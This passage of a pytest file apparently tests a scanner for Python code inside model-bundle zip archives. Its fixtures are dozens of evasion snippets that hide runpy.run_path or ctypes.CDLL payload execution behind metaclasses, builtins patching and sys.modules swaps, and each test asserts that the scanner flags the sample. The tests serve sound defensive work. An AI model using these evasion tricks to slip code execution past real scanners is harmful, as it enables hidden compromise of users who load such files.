        for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        (
            "import builtins\nimport runpy as rp\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update():\n"
            "        builtins.print = False\n"
            "def never_called():\n"
            "    class Safe:\n"
            "        @staticmethod\n"
            "        def update():\n"
            "            pass\n"
            "Safe.update()\nrunner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "def staticmethod(fn):\n"
            "    def mutate():\n"
            "        builtins.print = False\n"
            "    return mutate\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update():\n"
            "        pass\n"
            "Safe.update()\nrunner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import runpy as rp\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "def wrap(cls):\n"
            "    cls.update = dict.update\n"
            "    return cls\n"
            "@wrap\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(type):\n"
            "    def __getattribute__(cls, name):\n"
            "        if name == 'update':\n"
            "            return dict.update\n"
            "        return super().__getattribute__(name)\n"
            "class Safe(metaclass=Meta):\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "    update = dict.update\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "def alter(fn):\n"
            "    def update():\n"
            "        builtins.print = False\n"
            "    return update\n"
            "builtins.staticmethod = alter\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update():\n"
            "        pass\n"
            "Safe.update()\nrunner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import runpy as rp\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "def replace(fn):\n"
            "    return dict.update\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    @replace\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Safe:\n"
            "    staticmethod = lambda fn: dict.update\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "    if True:\n"
            "        update = dict.update\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "real_build = builtins.__build_class__\n"
            "def alter(fn, name, *bases, **kwargs):\n"
            "    cls = real_build(fn, name, *bases, **kwargs)\n"
            "    if name == 'Safe':\n"
            "        cls.update = dict.update\n"
            "    return cls\n"
            "builtins.__build_class__ = alter\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\nimport sys\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "def alter(fn):\n"
            "    return dict.update\n"
            "sys.modules['builtins'].staticmethod = alter\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport sys\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "def alter(fn):\n"
            "    return dict.update\n"
            "sys.modules['builtins'].__dict__['staticmethod'] = alter\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "Safe.update(rp.__dict__, run_path=original)\nrp.run_path('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update():\n"
            "        builtins.print = False\n"
            "match 1:\n"
            "    case 2:\n"
            "        class Safe:\n"
            "            @staticmethod\n"
            "            def update():\n"
            "                pass\n"
            "Safe.update()\nrunner = print or rp.run_path\nrunner('payload.py')\n"
        ),
    ],
)
def test_scan_zip_does_not_exempt_noncanonical_inert_method_dispatch(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_detects_restore_after_inert_shadowed_method_is_rebound(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy as rp\n"
        "original = rp.run_path\n"
        "rp.run_path = print\n"
        "class Safe:\n"
        "    @staticmethod\n"
        "    def update(*args, **kwargs):\n"
        "        pass\n"
        "Safe.update = dict.update\n"
        "Safe.update(rp.__dict__, run_path=original)\n"
        "rp.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_preserves_inert_method_across_dormant_unknown_call(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy as rp\nrp.run_path = print\n"
        "class Safe:\n"
        "    @staticmethod\n"
        "    def update():\n"
        "        pass\n"
        "def never_called():\n"
        "    callback()\n"
        "Safe.update()\nrp.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_preserves_inert_method_with_literal_class_metadata(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy as rp\nrp.run_path = print\n"
        "class Safe:\n"
        "    __slots__ = ()\n"
        "    marker: str\n"
        "    label: str = 'safe'\n"
        "    @staticmethod\n"
        "    def update():\n"
        "        pass\n"
        "Safe.update()\nrp.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_tracks_module_member_write_through_sys_modules(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\nimport sys\n"
        "original = runpy.run_path\nrunpy.run_path = print\n"
        "sys.modules['runpy'].run_path = original\n"
        "runpy.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_tracks_module_namespace_write_through_sys_modules(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\nimport sys\n"
        "original = runpy.run_path\nrunpy.run_path = print\n"
        "sys.modules['runpy'].__dict__['run_path'] = original\n"
        "runpy.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_tracks_module_replacement_through_sys_modules_import(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import ctypes\nimport sys\nsys.modules['runpy'] = ctypes\nimport runpy\nrunpy.CDLL('payload')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        and check.details["reason"] == "high-risk calls: ctypes.CDLL"
        for check in result.checks
    )


def test_scan_zip_tracks_module_replacement_through_sys_modules_from_import(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import ctypes\nimport sys\nsys.modules['runpy'] = ctypes\nfrom runpy import CDLL\nCDLL('payload')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        and check.details["reason"] == "high-risk calls: ctypes.CDLL"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "replacement_source",
    [
        "sys.modules.__setitem__('runpy', ctypes)",
        "dict.__setitem__(sys.modules, 'runpy', ctypes)",
        "sys.modules.update({'runpy': ctypes})",
        "dict.update(sys.modules, {'runpy': ctypes})",
        "sys.modules.update(runpy=ctypes)",
        "dict.update(sys.modules, runpy=ctypes)",
        "sys.modules.setdefault('runpy', ctypes)",
        "dict.setdefault(sys.modules, 'runpy', ctypes)",
    ],
)
def test_scan_zip_tracks_module_replacement_through_sys_modules_method_from_import(
    tmp_path: Path, replacement_source: str
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = f"import ctypes\nimport sys\n{replacement_source}\nfrom runpy import CDLL\nCDLL('payload')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        and check.details["reason"] == "high-risk calls: ctypes.CDLL"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "replacement_source",
    [
        "sys.modules['runpy'] = ctypes",
        "sys.modules.__setitem__('runpy', ctypes)",
    ],
)
def test_scan_zip_tracks_module_replacement_through_sys_modules_wildcard_import(
    tmp_path: Path, replacement_source: str
) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = f"import ctypes\nimport sys\n{replacement_source}\nfrom runpy import *\nCDLL('payload')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S110"
        and check.details["reason"] == "high-risk calls: ctypes.CDLL"
        for check in result.checks
    )


def test_scan_zip_ignores_missing_member_after_sys_modules_import_replacement(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = "import ctypes\nimport sys\nsys.modules['runpy'] = ctypes\nimport runpy\nrunpy.run_path('payload.py')\n"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_reimports_tracked_module_after_sys_modules_deletion(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\nimport sys\n"
        "runpy.run_path = print\n"
        "del sys.modules['runpy']\n"
        "import runpy as rp\n"
        "rp.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "source",
    [
        (
            "import builtins\nimport runpy as rp\n"
            "class Meta(type):\n"
            "    def __setattr__(cls, name, value):\n"
            "        builtins.print = False\n"
            "class Trigger(metaclass=Meta):\n"
            "    pass\n"
            "builtins.setattr(Trigger, 'x', 1)\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "class Meta(type):\n"
            "    def __delattr__(cls, name):\n"
            "        builtins.print = False\n"
            "class Trigger(metaclass=Meta):\n"
            "    pass\n"
            "builtins.delattr(Trigger, 'x')\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "class Meta(type):\n"
            "    def __getattribute__(cls, name):\n"
            "        builtins.print = False\n"
            "        return 1\n"
            "class Trigger(metaclass=Meta):\n"
            "    pass\n"
            "builtins.getattr(Trigger, 'x')\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "class Meta(type):\n"
            "    def __len__(cls):\n"
            "        builtins.print = False\n"
            "        return 1\n"
            "class Trigger(metaclass=Meta):\n"
            "    pass\n"
            "builtins.len(Trigger)\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\nimport types\n"
            "class Meta(types.ModuleType):\n"
            "    def __setattr__(self, name, value):\n"
            "        builtins.print = False\n"
            "rp.__class__ = Meta\n"
            "builtins.setattr(rp, 'run_path', print)\n"
            "runner = print or rp.run_path\nrunner('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\n"
            "class Meta(types.ModuleType):\n"
            "    def __setattr__(self, name, value):\n"
            "        if name == 'run_path':\n"
            "            value = original\n"
            "        object.__setattr__(self, name, value)\n"
            "rp.__class__ = Meta\n"
            "rp.run_path = print\n"
            "rp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'run_path':\n"
            "            return original\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "rp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'run_path':\n"
            "            return original\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "getattr(rp, 'run_path')('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'run_path':\n"
            "            return original\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "rp.__getattribute__('run_path')('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __setattr__(self, name, value):\n"
            "        if name == 'trigger':\n"
            "            object.__setattr__(self, 'run_path', original)\n"
            "        object.__setattr__(self, name, value)\n"
            "rp.__class__ = Meta\n"
            "rp.trigger = 1\n"
            "rp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == '__dict__':\n"
            "            object.__setattr__(self, 'run_path', original)\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "vars(rp).update(marker=1)\n"
            "rp.run_path('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == '__dict__':\n"
            "            return {'run_path': original}\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "rp.__dict__['run_path']('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == '__dict__':\n"
            "            return {'run_path': original}\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "getattr(rp, '__dict__')['run_path']('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == '__dict__':\n"
            "            return {'run_path': original}\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "dict.__getitem__(rp.__dict__, 'run_path')('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == '__dict__':\n"
            "            return {'run_path': original}\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "namespace = rp.__dict__\n"
            "namespace['run_path']('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == '__dict__':\n"
            "            return {'run_path': original}\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "rp.__getattribute__('__dict__')['run_path']('payload.py')\n"
        ),
        (
            "import runpy as rp\nimport types\n"
            "original = rp.run_path\nrp.run_path = print\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == '__dict__':\n"
            "            return {'run_path': original}\n"
            "        return super().__getattribute__(name)\n"
            "rp.__class__ = Meta\n"
            "namespace = rp.__getattribute__('__dict__')\n"
            "namespace['run_path']('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\nimport sys\n"
            "class Sink:\n"
            "    @staticmethod\n"
            "    def write(text):\n"
            "        builtins.print = False\n"
            "    @staticmethod\n"
            "    def flush():\n"
            "        pass\n"
            "sys.stdout = Sink\n"
            "print('safe')\n"
            "runner = print or rp.run_path\n"
            "runner('payload.py')\n"
        ),
        (
            "import builtins\nimport runpy as rp\n"
            "rp.run_path = print\n"
            "class Safe:\n"
            "    @staticmethod\n"
            "    def update(*args, **kwargs):\n"
            "        pass\n"
            "builtins.getattr = lambda obj, name: Safe\n"
            "getattr(builtins, 'dict').update(rp.__dict__, run_path=len)\n"
            "rp.run_path('payload.py')\n"
        ),
        (
            "import builtins as b\nimport runpy as rp\nimport types\n"
            "def mutate(value):\n"
            "    b.print = False\n"
            "    return 0\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'len':\n"
            "            return mutate\n"
            "        return super().__getattribute__(name)\n"
            "b.__class__ = Meta\n"
            "b.len(())\n"
            "runner = print or rp.run_path\n"
            "runner('payload.py')\n"
        ),
        (
            "import builtins as b\nimport runpy as rp\nimport types\n"
            "def mutate():\n"
            "    b.print = False\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'object':\n"
            "            return mutate\n"
            "        return super().__getattribute__(name)\n"
            "b.__class__ = Meta\n"
            "b.object()\n"
            "runner = print or rp.run_path\n"
            "runner('payload.py')\n"
        ),
        (
            "import builtins as b\nimport contextlib as c\nimport runpy as rp\nimport types\n"
            "def mutate(value):\n"
            "    b.print = False\n"
            "    return value\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'nullcontext':\n"
            "            return mutate\n"
            "        return super().__getattribute__(name)\n"
            "c.__class__ = Meta\n"
            "c.nullcontext(None)\n"
            "runner = print or rp.run_path\n"
            "runner('payload.py')\n"
        ),
        (
            "import builtins as b\nimport runpy as rp\nimport types\n"
            "def mutate(value):\n"
            "    b.print = False\n"
            "    return 0\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'len':\n"
            "            return mutate\n"
            "        return super().__getattribute__(name)\n"
            "b.__class__ = Meta\n"
            "from builtins import len as selected\n"
            "selected(())\n"
            "runner = print or rp.run_path\n"
            "runner('payload.py')\n"
        ),
        (
            "import builtins as b\nimport runpy as rp\nimport types\n"
            "def mutate():\n"
            "    b.print = False\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'object':\n"
            "            return mutate\n"
            "        return super().__getattribute__(name)\n"
            "b.__class__ = Meta\n"
            "from builtins import object as selected\n"
            "selected()\n"
            "runner = print or rp.run_path\n"
            "runner('payload.py')\n"
        ),
        (
            "import builtins as b\nimport contextlib as c\nimport runpy as rp\nimport types\n"
            "def mutate(value):\n"
            "    b.print = False\n"
            "    return value\n"
            "class Meta(types.ModuleType):\n"
            "    def __getattribute__(self, name):\n"
            "        if name == 'nullcontext':\n"
            "            return mutate\n"
            "        return super().__getattribute__(name)\n"
            "c.__class__ = Meta\n"
            "from contextlib import nullcontext as selected\n"
            "selected(None)\n"
            "runner = print or rp.run_path\n"
            "runner('payload.py')\n"
        ),
    ],
)
def test_scan_zip_invalidates_state_after_user_protocol_dispatch(tmp_path: Path, source: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_invalidates_state_after_implicit_builtin_object_dunder_dispatch(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy\n"
        "original = runpy.run_path\n"
        "runpy.run_path = print\n"
        "def mutate():\n"
        "    runpy.run_path = original\n"
        "object.__getattribute__(mutate, '__call__')()\n"
        "runpy.run_path('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "truth_test",
    [
        "if b:\n    pass\n",
        "while b:\n    break\n",
        "marker = 0 if b else 1\n",
        "b and None\n",
        "not b\n",
        "assert b\n",
        "[item for item in [1] if b]\n",
        "match 1:\n    case _ if b:\n        pass\n",
    ],
)
def test_scan_zip_invalidates_state_after_noncanonical_module_truth_test(tmp_path: Path, truth_test: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import builtins as b\nimport runpy as rp\nimport types\n"
        "class Meta(types.ModuleType):\n"
        "    def __bool__(self):\n"
        "        b.print = False\n"
        "        return True\n"
        "b.__class__ = Meta\n" + truth_test + "runner = print or rp.run_path\n"
        "runner('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "protocol_use",
    [
        "b[0]\n",
        "for item in b:\n    pass\n",
        "for [item] in [b]:\n    pass\n",
        "with b:\n    pass\n",
        "import contextlib as c\nwith c.nullcontext(b) as [item]:\n    pass\n",
        "0 in b\n",
        "b == 0\n",
        "f'{b}'\n",
        "b + 0\n",
        "[*b]\n",
        "{**b}\n",
        "import contextlib as c\nc.nullcontext(**b)\n",
        "{b: None}\n",
        "{b}\n",
        "{b for _ in [0]}\n",
        "{b: None for _ in [0]}\n",
        "[item for [item] in [b]]\n",
        "([item],) = (b,)\n",
        "value = 0\nvalue += b\n",
        "()[b:]\n",
        "[None][b]\n",
        "{0: None}[b]\n",
        "@b\ndef decorated():\n    pass\n",
        "class Derived(b):\n    pass\n",
        "match b:\n    case 0:\n        pass\n",
        "def defined(value: b[0]):\n    pass\n",
        "def defined_kw(*, value: b[0]):\n    pass\n",
        "unused = (item for item in b)\n",
    ],
)
def test_scan_zip_invalidates_state_after_noncanonical_module_protocol_use(tmp_path: Path, protocol_use: str) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import builtins as b\nimport runpy as rp\nimport types\n"
        "class Meta(types.ModuleType):\n"
        "    def mutate(self):\n"
        "        b.print = False\n"
        "    def __getitem__(self, key):\n"
        "        self.mutate()\n"
        "        return None\n"
        "    def __iter__(self):\n"
        "        self.mutate()\n"
        "        return iter(())\n"
        "    def __enter__(self):\n"
        "        self.mutate()\n"
        "        return self\n"
        "    def __exit__(self, *args):\n"
        "        return False\n"
        "    def __contains__(self, value):\n"
        "        self.mutate()\n"
        "        return False\n"
        "    def __eq__(self, value):\n"
        "        self.mutate()\n"
        "        return False\n"
        "    def __format__(self, spec):\n"
        "        self.mutate()\n"
        "        return ''\n"
        "    def __add__(self, value):\n"
        "        self.mutate()\n"
        "        return 0\n"
        "    def __radd__(self, value):\n"
        "        self.mutate()\n"
        "        return 0\n"
        "    def __hash__(self):\n"
        "        self.mutate()\n"
        "        return 0\n"
        "    def __index__(self):\n"
        "        self.mutate()\n"
        "        return 0\n"
        "    def __call__(self, value):\n"
        "        self.mutate()\n"
        "        return value\n"
        "    def __mro_entries__(self, bases):\n"
        "        self.mutate()\n"
        "        return ()\n"
        "    def keys(self):\n"
        "        self.mutate()\n"
        "        return ()\n"
        "b.__class__ = Meta\n" + protocol_use + "runner = print or rp.run_path\n"
        "runner('payload.py')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert any(
        check.name == "Python Archive Member Security"
        and check.status == CheckStatus.FAILED
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_scan_zip_does_not_execute_deferred_noncanonical_module_protocol(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import builtins as b\nimport runpy as rp\nimport types\n"
        "rp.run_path = print\n"
        "class Meta(types.ModuleType):\n"
        "    def __bool__(self):\n"
        "        b.print = False\n"
        "        return True\n"
        "b.__class__ = Meta\n"
        "unused = (item for item in [1] if b)\n"
        "rp.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_does_not_invalidate_state_after_module_identity_comparison(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import builtins as b\nimport runpy as rp\nimport types\n"
        "rp.run_path = print\n"
        "class Meta(types.ModuleType):\n"
        "    pass\n"
        "b.__class__ = Meta\n"
        "b is b\n"
        "b is not rp\n"
        "match b:\n"
        "    case captured:\n"
        "        pass\n"
        "match b:\n"
        "    case None:\n"
        "        pass\n"
        "rp.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_does_not_evaluate_postponed_protocol_annotations(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "from __future__ import annotations\n"
        "import builtins as b\nimport runpy as rp\nimport types\n"
        "rp.run_path = print\n"
        "class Meta(types.ModuleType):\n"
        "    def __getitem__(self, key):\n"
        "        b.print = False\n"
        "        return object\n"
        "b.__class__ = Meta\n"
        "field: b[0] = None\n"
        "def defined(value: b[0]) -> b[0]:\n"
        "    pass\n"
        "rp.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_does_not_evaluate_empty_comprehension_filters(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import builtins as b\nimport runpy as rp\nimport types\n"
        "rp.run_path = print\n"
        "class Meta(types.ModuleType):\n"
        "    def __bool__(self):\n"
        "        b.print = False\n"
        "        return True\n"
        "b.__class__ = Meta\n"
        "unused = [item for item in [] if b]\n"
        "rp.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_does_not_evaluate_lambda_body_in_comprehension(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
        "import runpy as rp\n"
        "rp.run_path = print\n"
        "unused = [(lambda: callback()) for item in [1]]\n"
        "rp.run_path('safe')\n"
    )
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("handler.py", source)

    result = ZipScanner().scan(str(archive_path))

    assert not any(
        check.name == "Python Archive Member Security" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_zip_tracks_restored_builtins_dict_descriptor(tmp_path: Path) -> None:
    archive_path = tmp_path / "model_bundle.zip"
    source = (
